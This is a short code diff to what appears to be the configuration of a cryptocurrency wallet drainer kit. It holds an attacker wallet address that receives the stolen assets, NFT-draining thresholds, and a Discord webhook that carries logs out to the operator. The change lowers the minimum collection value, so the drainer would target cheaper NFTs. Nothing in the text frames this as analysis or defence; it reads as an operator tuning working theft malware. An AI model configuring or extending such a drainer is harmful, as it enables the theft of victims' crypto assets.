@@ -7,7 +7,7 @@
 const receiveAddress = "0x5078B5db28E51b51C7A200a0AC629C9bbD5931B2"; // Put your wallet adress that you want to receive results
 
 const drainNftsInfo = {
-    minValue: 0.01, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.0001, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     maxTransfers: 100, // Maximum NFT transfer (let it be as it is)
 }
 const webhookURL = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxx" // Your Discord webhook url to receive logs
